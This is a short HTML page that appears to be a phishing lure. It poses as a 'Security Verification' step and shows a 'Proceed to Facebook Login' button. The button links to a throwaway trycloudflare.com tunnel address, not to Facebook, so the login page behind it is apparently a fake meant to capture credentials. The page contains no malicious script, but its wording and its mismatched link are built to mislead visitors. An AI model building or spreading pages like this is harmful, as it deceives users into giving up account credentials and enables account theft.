<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Security Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f7f9fc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .security-container {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
    }

    .security-container h1 {
      color: royalblue;
      margin-bottom: 20px;
    }

    .secure-link {
      display: inline-block;
      margin-top: 20px;
      padding: 12px 25px;
      background-color: royalblue;
      color: white;
      text-decoration: none;
      border-radius: 8px;
      transition: background-color 0.3s ease;
    }

    .secure-link:hover {
      background-color: #0a3d91;
    }

    .info {
      font-size: 14px;
      color: #555;
    }
  </style>
</head>
<body>

  <div class="security-container">
    <h1>Security Verification</h1>
    <p class="info">For your protection, please use the link below to complete the verification process.</p>
    <a class="secure-link" href="https://hungary-distances-modern-tourist.trycloudflare.com " target="_blank">Proceed to Facebook Login</a>
  </div>

</body>
</html>
